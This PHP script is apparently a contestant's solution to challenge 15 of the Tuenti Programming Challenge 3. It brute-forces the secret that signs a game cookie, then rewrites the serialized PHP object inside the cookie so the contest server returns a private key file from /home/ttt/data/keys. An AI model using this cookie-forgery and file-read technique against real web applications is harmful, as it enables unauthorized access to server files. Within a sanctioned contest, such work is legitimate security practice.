<?php

/*
	Tuenti Programming Challenge 3
	https://contest.tuenti.net/
	
	@author: shoghicp
	@email: shoghicp@gmail.com
	
	This must be run using at least PHP 5.4,
	enabling BCMath and the pthreads extension.
	TuentiLib: http://bit.ly/14jgAPV
	Windows binaries: http://bit.ly/14j6jTO
*/

//Challenge 15 - The only winning move is not to play
//http://ttt.contest.tuenti.net/

//THIS NEEDS cURL!


define("CHALLENGE", "15");
include("TuentiLib.php");

$key = TuentiLib::getLine();

$permutations = explode(" ", "TTUE TTUN TTUI TTEU TTEN TTEI TTNU TTNE TTNI TTIU TTIE TTIN TUTE TUTN TUTI TUET TUEN TUEI TUNT TUNE TUNI TUIT TUIE TUIN TETU TETN TETI TEUT TEUN TEUI TENT TENU TENI TEIT TEIU TEIN TNTU TNTE TNTI TNUT TNUE TNUI TNET TNEU TNEI TNIT TNIU TNIE TITU TITE TITN TIUT TIUE TIUN TIET TIEU TIEN TINT TINU TINE UTTE UTTN UTTI UTET UTEN UTEI UTNT UTNE UTNI UTIT UTIE UTIN UETT UETN UETI UENT UENI UEIT UEIN UNTT UNTE UNTI UNET UNEI UNIT UNIE UITT UITE UITN UIET UIEN UINT UINE ETTU ETTN ETTI ETUT ETUN ETUI ETNT ETNU ETNI ETIT ETIU ETIN EUTT EUTN EUTI EUNT EUNI EUIT EUIN ENTT ENTU ENTI ENUT ENUI ENIT ENIU EITT EITU EITN EIUT EIUN EINT EINU NTTU NTTE NTTI NTUT NTUE NTUI NTET NTEU NTEI NTIT NTIU NTIE NUTT NUTE NUTI NUET NUEI NUIT NUIE NETT NETU NETI NEUT NEUI NEIT NEIU NITT NITU NITE NIUT NIUE NIET NIEU ITTU ITTE ITTN ITUT ITUE ITUN ITET ITEU ITEN ITNT ITNU ITNE IUTT IUTE IUTN IUET IUEN IUNT IUNE IETT IETU IETN IEUT IEUN IENT IENU INTT INTU INTE INUT INUE INET INEU");


$ch = curl_init("http://ttt.contest.tuenti.net/?new");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$res = curl_exec($ch);
preg_match("#^Set-Cookie:\s*(game[^;]*)#mi", $res, $matches);
parse_str($matches[1], $cookie);
$game = explode("|", $cookie["game"]);
$object = $game[0];
$hash = TuentiLib::hexToStr($game[1]);
$found = false;
foreach($permutations as $secret){
	if(md5($object . $secret, true) === $hash){
		$found = true;
		break;
	}
}

if($found === false){
	while(true){} //I can kill it if it fails
}
$object = base64_decode($object);
$path = "/home/ttt/data/keys/".$key;
$object = str_replace("=", "", base64_encode(str_replace('s:35:"/home/ttt/data/messages/version.txt";', 's:'.strlen($path).':"'.$path.'";', $object)));
$cookie = "game=".$object."|".md5($object . $secret);

$ch = curl_init("http://ttt.contest.tuenti.net/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_HEADER, 1);
$res = curl_exec($ch);
preg_match("#^Set-Cookie:\s*(X\-Tuenti\-Powered\-By[^;]*)#mi", $res, $matches);
parse_str($matches[1], $cookie);
echo $cookie["X-Tuenti-Powered-By"].PHP_EOL;